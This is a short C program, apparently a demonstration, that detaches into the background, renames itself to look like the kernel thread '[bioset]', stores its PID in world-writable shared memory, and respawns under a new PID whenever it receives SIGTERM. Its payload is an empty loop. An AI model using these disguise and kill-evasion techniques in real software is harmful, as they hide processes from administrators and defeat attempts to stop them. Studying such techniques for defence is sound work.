#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/shm.h>
#include "shared.h"

static struct shared *shared;

void spawn_again(int signum)
{
	(void) signum; /* unused */

	pid_t pid = fork();
	if (pid == 0) {
		/* signalize change of pid ...
		 * don't bother with atomicity here...
		 * */
		shared->pid = getpid();
		setsid();
		return;
	}
	exit(EXIT_SUCCESS);
}

int main(int argc, char **argv)
{
	/* mask process name */
	strcpy(argv[0], "[bioset]");

	pid_t pid = fork();

	if (pid == 0) {

		setsid();
		/* Initialize shard memory */
		const int shmid = shmget(NUMBER_OF_THE_BEAST, sizeof(struct shared), IPC_CREAT | 0666);
		if (shmid == -1) {
			perror("shmget failed!");
			exit(EXIT_FAILURE);
		}
		shared = (struct shared*) shmat(shmid, NULL, 0);
		if (shared == NULL) {
			perror("shmat failed!");
			exit(EXIT_FAILURE);
		}
		shared->pid = getpid();

		/* Set signal handlers */
		struct sigaction new_action = { 0 };
		new_action.sa_handler = &spawn_again;
		sigaction (SIGTERM, &new_action, NULL);

		/* do something */
		while(1) {};
	} else {
		exit(EXIT_FAILURE);
	}
}
